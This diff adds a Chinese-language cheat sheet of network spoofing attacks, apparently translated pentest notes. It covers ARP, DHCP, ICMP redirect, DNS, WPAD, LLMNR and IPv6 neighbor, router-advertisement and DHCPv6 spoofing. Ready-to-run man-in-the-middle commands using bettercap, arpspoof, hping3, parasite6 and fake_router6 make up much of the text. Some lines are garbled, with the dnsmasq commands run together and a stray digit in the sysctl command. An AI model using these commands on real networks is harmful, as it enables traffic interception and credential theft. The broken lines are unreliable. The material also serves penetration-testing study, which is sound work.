@@ -1,0 +1,156 @@
+欺骗 (spoofing): 
+# 攻击者通过发送虚假的DHCP响应来配置新加入网络的所有网络参数（GW、IP、DNS）。
+
+#Ettercap
+yersinia dhcp -attack 2 #More parameters are needed
+
+
+ARP欺骗:
+# ARP欺骗是指发送虚假的ARP响应，以指示某台机器的IP地址与我们的设备的MAC地址相对应。
+# 然后，受害者将更改ARP表，并在每次想要与伪造的IP地址通信时与我们的机器联系。
+
+Bettercap:
+arp.spoof on
+
+set arp.spoof.targets <IP> 
+#Specific targets to ARP spoof (default=<entire subnet>)
+
+set arp.spoof.whitelist 
+#Specific targets to skip while spoofing
+
+set arp.spoof.fullduplex true 
+#If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
+
+set arp.spoof.internal true 
+#If true, local connections among computers of the network will be spoofed,
+# otherwise only connections going to and coming from the Internet (default=false)
+
+Arpspoof:
+# Arpspoof是一种网络欺骗技术，通过伪造ARP（地址解析协议）响应，欺骗目标设备与网关之间的通信。这种攻击技
+# 术可以用于中间人攻击，使攻击者能够拦截、篡改或窃取目标设备和网关之间的通信数据。
+
+# Arpspoof工具是一个命令行工具，可以在Linux和Unix系统上使用。它允许攻击者将自己伪装成网络中的其他
+# 设备，并发送虚假的ARP响应，欺骗目标设备将其网络流量发送到攻击者的机器上。
+
+# 使用Arpspoof时，攻击者需要在同一局域网中，具有网络访问权限，并且能够截获目标设备和网关之间的
+# 通信。通过欺骗目标设备，攻击者可以监视、篡改或窃取目标设备与网关之间的通信数据。
+
+# 要使用Arpspoof进行ARP欺骗攻击，可以使用以下命令：
+arpspoof -i <interface> -t <target> <gateway>
+
+# 其中，<interface>是攻击者所在的网络接口，<target>是目标设备的IP地址，<gateway>是网关的IP地址。
+
+# 请注意，使用Arpspoof进行ARP欺骗攻击是非法的，除非您有合法的授权和目的。本书仅提供技术信息，不鼓励或
+# 支持任何非法活动。
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -t 192.168.1.1 192.168.1.2
+arpspoof -t 192.168.1.2 192.168.1.1
+
+
+ICMP重定向:
+# ICMP重定向是指发送一个ICMP数据包，类型为1，代码为5，表示攻击者是到达某个IP地址的最佳路径。
+# 然后，当受害者想要联系该IP地址时，它会通过攻击者发送数据包。
+# Ettercap
+# icmp_redirect
+hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
+
+
+DNS欺骗:
+# 攻击者将解析受害者请求的一些（或全部）域名。
+set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
+
+# 使用dnsmasq配置自己的DNS
+
+# Dnsmasq是一个功能强大的工具，可以用于配置自己的DNS服务器。通过使用Dnsmasq，您可以将特定的
+# 域名解析到您选择的IP地址，从而实现更灵活的网络配置。
+
+# 以下是使用Dnsmasq配置自己的DNS的步骤：
+    # 安装Dnsmasq：首先，您需要安装Dnsmasq软件包。您可以使用适用于您的操作系统的包管理器来安装它。
+
+    # 编辑配置文件：找到Dnsmasq的配置文件，通常位于/etc/dnsmasq.conf。使用文本编辑器打开该文件。
+
+    # 配置DNS解析：在配置文件中，您可以使用以下语法将特定的域名解析到您选择的IP地址：
+    # address=/example.com/192.168.1.100
+    # 在上面的示例中，将example.com解析为192.168.1.100。您可以根据需要添加多个解析规则。
+
+    # 保存并关闭文件：在完成配置后，保存并关闭配置文件。
+
+    # 重启Dnsmasq服务：使用适用于您的操作系统的命令，重启Dnsmasq服务以使更改生效
+
+# 现在，您已成功配置了自己的DNS服务器。当您的系统尝试解析配置的域名时，它将使用您指定的IP地址进行解析
+# 。这使您能够更好地控制网络流量和访问。
+apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
+dig @localhost domain.example.com # Test the configured DNS
+
+
+本地网关:
+# 通常存在多个系统和网络的路由。在构建本地网络中的MAC地址列表后，
+# 使用 gateway-finder.py 来识别支持IPv4转发的主机。
+root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
+
+root@kali:~# cd gateway-finder/
+
+root@kali:~# arp-scan -l | tee hosts.txt
+# Interface: eth0, datalink type: EN10MB (Ethernet)
+# Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
+# 10.0.0.100     00:13:72:09:ad:76       Dell Inc.
+# 10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
+# 10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.
+
+root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
+# gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
+# [+] Using interface eth0 (-I to change)
+# [+] Found 3 MAC addresses in hosts.txt
+# [+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
+# [+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
+
+
+欺骗LLMNR NBT-NS 和 mDNS:
+# Microsoft系统在DNS查找失败时，使用链路本地组播名称解析（LLMNR）和NetBIOS名称服务
+# （NBT-NS）进行本地主机解析。Apple Bonjour和Linux零配置实现使用多播DNS（mDNS）来发现网
+# 络中的系统。这些协议是未经身份验证的，并通过UDP广播消息；因此，攻击者可以利用它们将用户引导到恶意服务。
+
+# 您可以使用Responder来发送虚假响应，冒充主机搜索的服务。
+# 在此处阅读有关如何使用Responder冒充服务的更多信息。
+
+
+欺骗WPAD:
+# 许多浏览器使用Web代理自动发现（WPAD）从网络加载代理设置。WPAD服务器通过特
+# 定的URL（例如，http://wpad.example.org/wpad.dat）提供客户端代理设置，当通
+# 过以下任一方式识别时：
+    # DHCP，使用代码252条目34
+    # DNS，在本地域中搜索_wpad_主机名
+    # Microsoft LLMNR和NBT-NS（在DNS查找失败的情况下）
+
+# Responder自动化了WPAD攻击-运行代理并通过DHCP、DNS、LLMNR和NBT-NS将客户端引导到恶意WPAD服务器。
+# 在此处阅读有关如何使用Responder冒充服务的更多信息。
+
+
+欺骗SSDP 和 UPnP设备:
+# 您可以在网络中提供不同的服务，试图欺骗用户输入一些明文凭据。有关此攻击的更多信息，请参阅欺骗SSDP和UPnP设备。
+
+
+IPv6 邻居欺骗:
+# 这种攻击与ARP欺骗非常相似，但适用于IPv6环境。您可以让受害者认为网关的IPv6具有攻击者的MAC地址。
+sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
+
+sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
+
+
+IPv6路由器广播欺骗 / 洪水攻击:
+# 一些操作系统默认通过网络中发送的RA数据包配置网关。要将攻击者声明为IPv6路由器，您可以使用以下方法：
+sysctl -w net.ipv6.conf.all.forwarding=1 4
+
+ip route add default via <ROUTER_IPv6> dev wlan0
+
+fake_router6 wlan0 fe80::01/16
+
+
+IPv6 DHCP欺骗:
+# 默认情况下，一些操作系统会尝试通过读取网络中的DHCPv6数据包来配置DNS。因此，攻击者可以发送一
+# 个DHCPv6数据包来将自己配置为DNS服务器。DHCP还会为受害者提供一个IPv6地址。
+dhcp6.spoof on
+dhcp6.spoof.domains <list of domains>
+
+
+
